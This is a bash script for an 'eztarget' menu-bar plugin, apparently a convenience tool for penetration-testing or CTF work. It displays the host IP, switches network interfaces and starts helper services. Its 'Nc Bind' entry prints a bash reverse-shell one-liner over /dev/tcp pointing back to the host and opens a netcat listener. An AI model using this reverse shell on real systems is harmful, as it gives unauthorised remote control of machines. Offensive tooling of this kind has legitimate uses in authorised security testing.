#!/usr/bin/env bash

# Load global configs
if test -f $HOME/.eztarget/eztarget.config; then
        source $HOME/.eztarget/eztarget.config
fi

# Load configs
if test -f $CONFIG_HOST; then
	source $CONFIG_HOST
fi
if test -f $CONFIG_INTERFACE; then
	source $CONFIG_INTERFACE
fi
if test -f $CONFIG_TARGET; then
	source $CONFIG_TARGET
fi


# HEAD
# Show Host IP
if [[ -n "${HOST_INTERFACE// /}" ]]; then
	HOST_IP=$(ip -f inet addr show $HOST_INTERFACE | sed -En -e 's/. *inet ([0-9.]+).*/\1/p')
        if [[ -n "${HOST_IP// /}" ]]; then
                echo "IP: <span color='$HOST_COLOR'><tt>$HOST_IP</tt></span> ($HOST_INTERFACE)"
        else
                echo "IP: Not Found"
        fi
else
	echo "IP: Interface Not Set"
fi

echo "---"

# BODY

# Interface Select
echo "Interface"
LIST_INTERFACES=$(ip -o link show | awk -F': ' '{print $2}')
while IFS= read -r line; do
	echo "--$line | bash='echo HOST_INTERFACE=$line > $CONFIG_INTERFACE' terminal=false refresh=true";
done <<< "$LIST_INTERFACES"

# Host Utilities
echo "Host"
echo "--Shell | bash='export EZTARGET=\"$TARGET\"; export EZHOST=\"$HOST_IP\"; source $LIB_FOLDER/shell.sh'"
echo "--Web | bash='cd $HOST_WEBROOT && python3 -m http.server $HOST_WEBPORT'"
echo "--Nc Bind | bash='echo \"REVERSE SHELL CMD: bash -i >& /dev/tcp/$HOST_IP/$HOST_NCPORT 0>&1\"; nc -lvp $HOST_NCPORT'"


# Config
echo "Edit"
echo "--Host Config | bash='nano $CONFIG_HOST; exit'"
